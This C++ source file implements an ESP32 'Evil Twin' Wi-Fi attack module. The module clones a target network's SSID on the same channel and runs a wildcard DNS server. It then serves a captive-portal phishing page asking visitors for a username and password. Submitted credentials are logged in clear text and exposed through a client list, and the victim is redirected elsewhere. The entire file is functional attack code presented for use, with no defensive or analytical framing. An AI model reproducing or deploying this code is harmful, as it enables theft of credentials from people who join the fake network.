/*
 * EvilTwinAttack.cpp
 * 
 * Implementation of the Evil Twin Attack module
 */

#include "EvilTwinAttack.h"
#include <WiFi.h>

EvilTwinAttack::EvilTwinAttack() : Attack(ATTACK_TYPE_EVIL_TWIN, "Evil Twin") {
  // Initialize parameters with defaults
  targetSSID = "";
  apPassword = "password123";
  openNetwork = false;
  apIP = IPAddress(192, 168, 4, 1);
  netMask = IPAddress(255, 255, 255, 0);
  channel = 1;
  maxClients = 4;
  captivePortal = true;
  portalTitle = "WiFi Authentication Required";
  portalSubtitle = "Please sign in to continue";
  redirectURL = "http://www.google.com";
  
  // Initialize state variables
  apActive = false;
  
  // Initialize servers
  dnsServer = nullptr;
  webServer = nullptr;
}

EvilTwinAttack::~EvilTwinAttack() {
  // Clean up
  stop();
}

bool EvilTwinAttack::start(unsigned long duration) {
  // Don't start if already running
  if (status == ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Reset error message
  errorMessage = "";
  
  // Check if we have a target SSID
  if (targetSSID.length() == 0) {
    errorMessage = "No target SSID specified";
    status = ATTACK_STATUS_ERROR;
    return false;
  }
  
  // Scan for target AP to get channel
  if (!scanForTargetAP()) {
    // If target not found, use default channel
    Serial.println("Target AP not found, using default channel");
  }
  
  // Set up the access point
  setupAP();
  
  // Set up DNS server for captive portal if enabled
  if (captivePortal) {
    setupDNS();
  }
  
  // Set up web server
  setupWebServer();
  
  Serial.println("Evil Twin Attack started");
  Serial.print("SSID: ");
  Serial.println(targetSSID);
  Serial.print("Channel: ");
  Serial.println(channel);
  Serial.print("IP Address: ");
  Serial.println(apIP);
  
  // Set start time and duration
  startTime = millis();
  this->duration = duration;
  
  // Update status
  status = ATTACK_STATUS_RUNNING;
  
  return true;
}

bool EvilTwinAttack::stop() {
  // Only stop if running
  if (status != ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Stop web server
  if (webServer) {
    webServer->stop();
    delete webServer;
    webServer = nullptr;
  }
  
  // Stop DNS server
  if (dnsServer) {
    dnsServer->stop();
    delete dnsServer;
    dnsServer = nullptr;
  }
  
  // Stop AP
  WiFi.softAPdisconnect(true);
  apActive = false;
  
  // Clear client list
  clients.clear();
  
  Serial.println("Evil Twin Attack stopped");
  
  // Update status
  status = ATTACK_STATUS_STOPPING;
  
  return true;
}

void EvilTwinAttack::update() {
  // Call base class update
  Attack::update();
  
  // Only perform actions if running
  if (status == ATTACK_STATUS_RUNNING) {
    // Process DNS requests if captive portal is enabled
    if (captivePortal && dnsServer) {
      dnsServer->processNextRequest();
    }
    
    // Process web server requests
    if (webServer) {
      webServer->handleClient();
    }
    
    // Check for new clients
    wifi_sta_list_t stationList;
    tcpip_adapter_sta_list_t adapterList;
    
    esp_wifi_ap_get_sta_list(&stationList);
    tcpip_adapter_get_sta_list(&stationList, &adapterList);
    
    for (int i = 0; i < adapterList.num; i++) {
      tcpip_adapter_sta_info_t station = adapterList.sta[i];
      IPAddress ip(station.ip.addr);
      
      // Check if this client is already in our list
      bool found = false;
      for (const EvilTwinClient& client : clients) {
        if (ip == client.ip) {
          found = true;
          break;
        }
      }
      
      // If not found, add it
      if (!found && clients.size() < MAX_EVIL_TWIN_CLIENTS) {
        EvilTwinClient newClient;
        newClient.ip = ip;
        memcpy(newClient.mac, station.mac, 6);
        newClient.hostname = "";
        newClient.connectTime = millis();
        newClient.authenticated = false;
        newClient.username = "";
        newClient.password = "";
        
        clients.push_back(newClient);
        
        Serial.print("New client connected: ");
        Serial.print(ip.toString());
        Serial.print(" (");
        printMACAddress(newClient.mac);
        Serial.println(")");
      }
    }
  }
}

bool EvilTwinAttack::setParameter(const String& name, const String& value) {
  if (name == "ssid") {
    targetSSID = value;
    return true;
  }
  else if (name == "password") {
    apPassword = value;
    return true;
  }
  else if (name == "open") {
    if (value == "true" || value == "1") {
      openNetwork = true;
      return true;
    } else if (value == "false" || value == "0") {
      openNetwork = false;
      return true;
    } else {
      errorMessage = "Invalid value (use true/false or 1/0)";
      return false;
    }
  }
  else if (name == "ip") {
    IPAddress ip;
    if (ip.fromString(value)) {
      apIP = ip;
      return true;
    } else {
      errorMessage = "Invalid IP address format";
      return false;
    }
  }
  else if (name == "channel") {
    int ch = value.toInt();
    if (ch >= 1 && ch <= 14) {
      channel = ch;
      return true;
    } else {
      errorMessage = "Invalid channel (must be 1-14)";
      return false;
    }
  }
  else if (name == "maxclients") {
    int max = value.toInt();
    if (max > 0 && max <= 8) {
      maxClients = max;
      return true;
    } else {
      errorMessage = "Invalid max clients (must be 1-8)";
      return false;
    }
  }
  else if (name == "captiveportal") {
    if (value == "true" || value == "1") {
      captivePortal = true;
      return true;
    } else if (value == "false" || value == "0") {
      captivePortal = false;
      return true;
    } else {
      errorMessage = "Invalid value (use true/false or 1/0)";
      return false;
    }
  }
  else if (name == "title") {
    portalTitle = value;
    return true;
  }
  else if (name == "subtitle") {
    portalSubtitle = value;
    return true;
  }
  else if (name == "redirect") {
    redirectURL = value;
    return true;
  }
  
  errorMessage = "Unknown parameter: " + name;
  return false;
}

String EvilTwinAttack::getParameter(const String& name) const {
  if (name == "ssid") {
    return targetSSID;
  }
  else if (name == "password") {
    return apPassword;
  }
  else if (name == "open") {
    return openNetwork ? "true" : "false";
  }
  else if (name == "ip") {
    return apIP.toString();
  }
  else if (name == "channel") {
    return String(channel);
  }
  else if (name == "maxclients") {
    return String(maxClients);
  }
  else if (name == "captiveportal") {
    return captivePortal ? "true" : "false";
  }
  else if (name == "title") {
    return portalTitle;
  }
  else if (name == "subtitle") {
    return portalSubtitle;
  }
  else if (name == "redirect") {
    return redirectURL;
  }
  else if (name == "clients") {
    return getClientList();
  }
  else if (name == "status") {
    return apActive ? "active" : "inactive";
  }
  
  return "";
}

String EvilTwinAttack::getAllParameters() const {
  String params = "{";
  params += "\"ssid\":\"" + targetSSID + "\",";
  params += "\"password\":\"" + apPassword + "\",";
  params += "\"open\":" + String(openNetwork ? "true" : "false") + ",";
  params += "\"ip\":\"" + apIP.toString() + "\",";
  params += "\"channel\":" + String(channel) + ",";
  params += "\"maxclients\":" + String(maxClients) + ",";
  params += "\"captiveportal\":" + String(captivePortal ? "true" : "false") + ",";
  params += "\"title\":\"" + portalTitle + "\",";
  params += "\"subtitle\":\"" + portalSubtitle + "\",";
  params += "\"redirect\":\"" + redirectURL + "\",";
  params += "\"status\":\"" + String(apActive ? "active" : "inactive") + "\",";
  params += "\"client_count\":" + String(clients.size());
  params += "}";
  
  return params;
}

bool EvilTwinAttack::scanForTargetAP() {
  Serial.println("Scanning for target AP...");
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  
  int n = WiFi.scanNetworks();
  Serial.print(n);
  Serial.println(" networks found");
  
  bool found = false;
  
  for (int i = 0; i < n; ++i) {
    // Check if this is our target network
    if (WiFi.SSID(i) == targetSSID) {
      found = true;
      channel = WiFi.channel(i);
      
      Serial.print("Found target network: ");
      Serial.print(WiFi.SSID(i));
      Serial.print(" on channel ");
      Serial.println(channel);
      
      break;
    }
  }
  
  WiFi.scanDelete();
  
  return found;
}

void EvilTwinAttack::setupAP() {
  // Configure access point
  WiFi.mode(WIFI_AP);
  
  // Configure IP address
  WiFi.softAPConfig(apIP, apIP, netMask);
  
  // Start access point
  if (openNetwork) {
    apActive = WiFi.softAP(targetSSID.c_str(), nullptr, channel, false, maxClients);
  } else {
    apActive = WiFi.softAP(targetSSID.c_str(), apPassword.c_str(), channel, false, maxClients);
  }
  
  if (apActive) {
    Serial.print("AP started with IP: ");
    Serial.println(WiFi.softAPIP());
  } else {
    Serial.println("Failed to start AP");
  }
}

void EvilTwinAttack::setupDNS() {
  // Create DNS server
  dnsServer = new DNSServer();
  
  // Start DNS server (redirect all domains to our IP)
  dnsServer->start(53, "*", apIP);
  
  Serial.println("DNS server started");
}

void EvilTwinAttack::setupWebServer() {
  // Create web server
  webServer = new WebServer(80);
  
  // Set up handlers
  webServer->on("/", [this]() { handleRoot(); });
  webServer->on("/login", HTTP_POST, [this]() { handleLogin(); });
  webServer->onNotFound([this]() { handleNotFound(); });
  
  // Start web server
  webServer->begin();
  
  Serial.println("Web server started");
}

void EvilTwinAttack::handleRoot() {
  Serial.println("Client requested root page");
  
  // Get client IP
  IPAddress clientIP = webServer->client().remoteIP();
  EvilTwinClient* client = findClient(clientIP);
  
  // Add client if not found
  if (!client) {
    addClient(webServer->client());
    client = findClient(clientIP);
  }
  
  // Check if client is authenticated
  if (client && client->authenticated) {
    // Redirect to the specified URL
    webServer->sendHeader("Location", redirectURL, true);
    webServer->send(302, "text/plain", "");
    Serial.print("Authenticated client redirected to: ");
    Serial.println(redirectURL);
  } else {
    // Show login page
    String html = getHTMLHeader();
    html += getLoginForm();
    html += getHTMLFooter();
    
    webServer->send(200, "text/html", html);
    Serial.print("Sent login page to client: ");
    Serial.println(clientIP.toString());
  }
}

void EvilTwinAttack::handleLogin() {
  Serial.println("Client submitted login form");
  
  // Get client IP
  IPAddress clientIP = webServer->client().remoteIP();
  EvilTwinClient* client = findClient(clientIP);
  
  // Add client if not found
  if (!client) {
    addClient(webServer->client());
    client = findClient(clientIP);
  }
  
  // Get form data
  String username = webServer->arg("username");
  String password = webServer->arg("password");
  
  // URL decode the values
  username = urlDecode(username);
  password = urlDecode(password);
  
  Serial.print("Captured credentials - Username: ");
  Serial.print(username);
  Serial.print(", Password: ");
  Serial.println(password);
  
  // Store credentials
  if (client) {
    client->authenticated = true;
    client->username = username;
    client->password = password;
  }
  
  // Redirect to success page or external URL
  webServer->sendHeader("Location", redirectURL, true);
  webServer->send(302, "text/plain", "");
  Serial.print("Redirecting client to: ");
  Serial.println(redirectURL);
}

void EvilTwinAttack::handleNotFound() {
  // For captive portal, redirect all requests to the root
  webServer->sendHeader("Location", "http://" + apIP.toString(), true);
  webServer->send(302, "text/plain", "");
  Serial.print("Redirected client to captive portal: ");
  Serial.println(webServer->client().remoteIP().toString());
}

void EvilTwinAttack::printMACAddress(const uint8_t* mac) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  Serial.print(macStr);
}

String EvilTwinAttack::getMACAddressString(const uint8_t* mac) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void EvilTwinAttack::addClient(WiFiClient client) {
  if (clients.size() >= MAX_EVIL_TWIN_CLIENTS) {
    return;
  }
  
  IPAddress ip = client.remoteIP();
  
  // Check if client already exists
  for (const EvilTwinClient& existingClient : clients) {
    if (existingClient.ip == ip) {
      return;
    }
  }
  
  // Create new client
  EvilTwinClient newClient;
  newClient.ip = ip;
  // We don't have MAC address here, it will be filled in update()
  memset(newClient.mac, 0, 6);
  newClient.hostname = "";
  newClient.connectTime = millis();
  newClient.authenticated = false;
  newClient.username = "";
  newClient.password = "";
  
  clients.push_back(newClient);
  
  Serial.print("Added client: ");
  Serial.println(ip.toString());
}

void EvilTwinAttack::removeClient(IPAddress ip) {
  for (auto it = clients.begin(); it != clients.end(); ++it) {
    if (it->ip == ip) {
      clients.erase(it);
      Serial.print("Removed client: ");
      Serial.println(ip.toString());
      return;
    }
  }
}

EvilTwinClient* EvilTwinAttack::findClient(IPAddress ip) {
  for (auto it = clients.begin(); it != clients.end(); ++it) {
    if (it->ip == ip) {
      return &(*it);
    }
  }
  
  return nullptr;
}

String EvilTwinAttack::getClientList() {
  String result = "[";
  
  for (size_t i = 0; i < clients.size(); i++) {
    const EvilTwinClient& client = clients[i];
    
    result += "{";
    result += "\"ip\":\"" + client.ip.toString() + "\",";
    result += "\"mac\":\"" + getMACAddressString(client.mac) + "\",";
    result += "\"hostname\":\"" + client.hostname + "\",";
    result += "\"connected_time\":" + String((millis() - client.connectTime) / 1000) + ",";
    result += "\"authenticated\":" + String(client.authenticated ? "true" : "false");
    
    if (client.authenticated) {
      result += ",\"username\":\"" + client.username + "\",";
      result += "\"password\":\"" + client.password + "\"";
    }
    
    result += "}";
    
    if (i < clients.size() - 1) {
      result += ",";
    }
  }
  
  result += "]";
  
  return result;
}

String EvilTwinAttack::getHTMLHeader() {
  String html = "<!DOCTYPE html>\n";
  html += "<html>\n";
  html += "<head>\n";
  html += "  <meta charset=\"UTF-8\">\n";
  html += "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n";
  html += "  <title>" + portalTitle + "</title>\n";
  html += "  <style>\n";
  html += "    body {\n";
  html += "      font-family: Arial, sans-serif;\n";
  html += "      background-color: #f5f5f5;\n";
  html += "      margin: 0;\n";
  html += "      padding: 20px;\n";
  html += "    }\n";
  html += "    .container {\n";
  html += "      max-width: 400px;\n";
  html += "      margin: 0 auto;\n";
  html += "      background-color: white;\n";
  html += "      border-radius: 5px;\n";
  html += "      padding: 20px;\n";
  html += "      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);\n";
  html += "    }\n";
  html += "    h1 {\n";
  html += "      color: #333;\n";
  html += "      font-size: 24px;\n";
  html += "      margin-top: 0;\n";
  html += "      text-align: center;\n";
  html += "    }\n";
  html += "    p {\n";
  html += "      color: #666;\n";
  html += "      text-align: center;\n";
  html += "      margin-bottom: 20px;\n";
  html += "    }\n";
  html += "    .form-group {\n";
  html += "      margin-bottom: 15px;\n";
  html += "    }\n";
  html += "    label {\n";
  html += "      display: block;\n";
  html += "      margin-bottom: 5px;\n";
  html += "      font-weight: bold;\n";
  html += "    }\n";
  html += "    input[type=\"text\"],\n";
  html += "    input[type=\"password\"] {\n";
  html += "      width: 100%;\n";
  html += "      padding: 8px;\n";
  html += "      border: 1px solid #ddd;\n";
  html += "      border-radius: 4px;\n";
  html += "      box-sizing: border-box;\n";
  html += "    }\n";
  html += "    button {\n";
  html += "      background-color: #4285f4;\n";
  html += "      color: white;\n";
  html += "      border: none;\n";
  html += "      padding: 10px 15px;\n";
  html += "      border-radius: 4px;\n";
  html += "      width: 100%;\n";
  html += "      cursor: pointer;\n";
  html += "      font-size: 16px;\n";
  html += "    }\n";
  html += "    button:hover {\n";
  html += "      background-color: #3367d6;\n";
  html += "    }\n";
  html += "  </style>\n";
  html += "</head>\n";
  html += "<body>\n";
  html += "  <div class=\"container\">\n";
  
  return html;
}

String EvilTwinAttack::getHTMLFooter() {
  String html = "  </div>\n";
  html += "</body>\n";
  html += "</html>";
  
  return html;
}

String EvilTwinAttack::getLoginForm() {
  String html = "    <h1>" + portalTitle + "</h1>\n";
  html += "    <p>" + portalSubtitle + "</p>\n";
  html += "    <form action=\"/login\" method=\"post\">\n";
  html += "      <div class=\"form-group\">\n";
  html += "        <label for=\"username\">Username or Email:</label>\n";
  html += "        <input type=\"text\" id=\"username\" name=\"username\" required>\n";
  html += "      </div>\n";
  html += "      <div class=\"form-group\">\n";
  html += "        <label for=\"password\">Password:</label>\n";
  html += "        <input type=\"password\" id=\"password\" name=\"password\" required>\n";
  html += "      </div>\n";
  html += "      <button type=\"submit\">Sign In</button>\n";
  html += "    </form>\n";
  
  return html;
}

String EvilTwinAttack::urlDecode(String input) {
  String decoded = "";
  char temp[] = "0x00";
  
  for (size_t i = 0; i < input.length(); i++) {
    if (input[i] == '%') {
      if (i + 2 < input.length()) {
        temp[2] = input[i + 1];
        temp[3] = input[i + 2];
        decoded += (char)strtol(temp, NULL, 16);
        i += 2;
      }
    } else if (input[i] == '+') {
      decoded += ' ';
    } else {
      decoded += input[i];
    }
  }
  
  return decoded;
}
